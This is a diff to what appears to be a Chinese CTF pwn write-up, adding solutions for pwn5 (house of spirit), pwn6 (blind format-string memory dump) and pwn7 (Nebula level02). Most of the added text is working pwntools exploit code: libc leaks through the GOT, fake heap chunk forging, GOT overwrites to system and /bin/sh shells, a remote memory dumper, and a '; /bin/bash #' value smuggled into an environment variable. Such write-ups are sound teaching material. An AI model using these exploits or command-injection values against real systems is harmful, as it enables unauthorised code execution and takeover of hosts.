@@ -12,8 +12,11 @@ category:  	writeup
 >0x002 pwn2(mmap)  
 >0x003 pwn3(数组越界)  
 >0x004 pwn4(格式化字符串 + mprotect)  
->0x005 pwn5  
+>0x005 pwn5(house of spirit)  
+>0x006 pwn6(leak memory)  
 <!-- more -->
+>0x007 pwn7(环境变量)  
+>0x008 pwn8(setbuf)  
 
 
 ## 0x001 pwn1(strlen的"\x00"截断)
@@ -464,4 +467,210 @@ s.interactive()
 ```
 
 
-## 0x005 pwn5
+## 0x005 pwn5(house of spirit)
+
+选择View->Open Subviews->Local Types，通过INSERT键插入新建一个结构体
+```
+#pragma pack(1)
+struct rifle
+{
+  char desc[0x19];
+  char name[0x1b];
+  char *addr;
+};
+```
+
+泄露libc基址
+![](/assets/img/note/2018-02-23-others-pwn-writeup/0x005-001.png)
+![](/assets/img/note/2018-02-23-others-pwn-writeup/0x005-002.png)
+
+伪造chunk，设置当前chunk的size与下一个chunk的size，绕过check
+![](/assets/img/note/2018-02-23-others-pwn-writeup/0x005-003.png)
+
+exp.py
+```
+#!/usr/bin/env python
+# -*- coding=utf-8 -*-
+from pwn import *
+context.log_level = "debug"
+
+elf = ELF("./oreo")
+libc = ELF("/lib/i386-linux-gnu/libc.so.6")
+
+def add(name,desc):
+  s.sendlineafter("Action: ","1")
+  s.sendlineafter("name: ",name)
+  s.sendlineafter("description: ",desc)
+def show():
+  s.sendlineafter("Action: ","2")
+
+def delete():
+  s.sendlineafter("Action: ","3")
+
+def modify(msg):
+  s.sendlineafter("Action: ","4")
+  s.sendlineafter("order: ",msg)
+  
+
+log.info("-----------------------leak libc_base--------------------")
+pause()
+
+scanf_got = 0x0804A258
+
+s = process("./oreo",stdin=PTY)
+add("A"*0x1b+p32(scanf_got-25),"AAA")
+show()
+s.recvuntil("Name: ")
+s.recvuntil("Name: ")
+data = s.recv(4)
+scanf_addr = u32(data)
+print hex(scanf_addr)
+
+
+log.info("-----------------------house of spirit--------------------")
+pause()
+
+libc_base = scanf_addr - libc.symbols["__isoc99_sscanf"]
+system_addr = libc.symbols["system"] + libc_base
+heap_addr = 0x0804A2A0
+
+print hex(libc_base)
+print hex(system_addr)
+
+for i in range(0x40-1):
+  add("AAAA","BBBB")
+add("A"*0x1b+p32(heap_addr+8),"BBBB") 
+modify("\x00\x00\x00\x00"*9+p32(0x41))
+delete()
+
+add("AAAA",p32(scanf_got))
+modify(p32(system_addr))
+s.sendline("/bin/sh\x00")
+s.interactive()
+```
+
+
+## 0x006 pwn6(dump memory)
+
+没有bin的题
+```
+栈溢出用"AAAAA..."测试
+
+格式化字符串用"AAAA.%p.%p.%p...."测试
+```
+
+得到偏移量11
+```
+root@ubuntu:~/workspace/pwn6# nc 127.0.0.1 10001
+AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+AAAA.0xfffcb0fc.0x400.0x174.0x174.0x44.0x44.0xfffcb5b4.0x4.0x7.0x1af23c.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
+```
+
+或者利用pwntools
+```
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+context.log_level = "debug"
+
+def exec_fmt(payload):
+  s = remote("127.0.0.1",10001)
+  s.sendline(payload)
+  info = s.recv()
+  s.close()
+  return info
+autofmt = FmtStr(exec_fmt)
+print autofmt.offset
+```
+![](/assets/img/note/2018-02-23-others-pwn-writeup/0x006-001.png)
+
+dump memory
+```
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+
+context.log_level = "debug"
+
+f = open("bin","ab+")
+begin = 0x08048000
+offset = 0
+while True:
+  addr = begin + offset
+  s = process("pwn6")
+  s.sendline("%13$sAAA" + p32(addr))
+  try:
+    info = s.recvuntil("AAA")[:-3]
+  except EOFError:
+    print offset
+    break
+  info += "\x00"
+  s.close()
+  offset += len(info)
+  f.write(info)
+  f.flush()
+f.close()
+```
+
+dump下来的文件与原文件差别很大，但直接看汇编还是能识别出几个函数
+![](/assets/img/note/2018-02-23-others-pwn-writeup/0x006-002.png)
+
+得到printf_got是0x0804A010
+![](/assets/img/note/2018-02-23-others-pwn-writeup/0x006-003.png)
+
+exp.py
+```
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+context.log_level = "debug"
+
+s = remote("127.0.0.1", 10001)
+
+printf_got = 0x804a010
+p = "%13$sAAA" + p32(printf_got)
+s.sendline(p)
+data = s.recv()
+print data.encode("hex")
+
+print_addr = u32(data[:4])
+print hex(print_addr)
+print2sys_off = 59600
+system_addr = print_addr - print2sys_off
+
+p = fmtstr_payload(11, {printf_got: system_addr})
+s.sendline(p)
+s.sendline("/bin/sh")
+s.interactive()
+```
+
+
+## 0x007 pwn7
+
+了解一下几个格式化函数
+```
+int sprintf(char *str, char * format [, argument, ...]);
+
+int snprintf(char*str, size_t size,constchar* restrict format, ...);
+
+int asprintf(char **strp, const char *fmt, ...);
+```
+
+通过构造system("/bin/echo ; /bin/bash # is cool")拿到shell
+![](/assets/img/note/2018-02-23-others-pwn-writeup/0x007-001.png)
+
+getflag~
+```
+level02@nebula:/home/flag02$ $USER="; /bin/bash #"
+level02@nebula:/home/flag02$ ./flag02
+about to call system("/bin/echo ; /bin/bash # is cool")
+flag02@nebula:/home/flag02$ getflag
+You have successfully executed getflag on a target account
+```
+
+
+## 0x008 pwn8(setbuf)
+
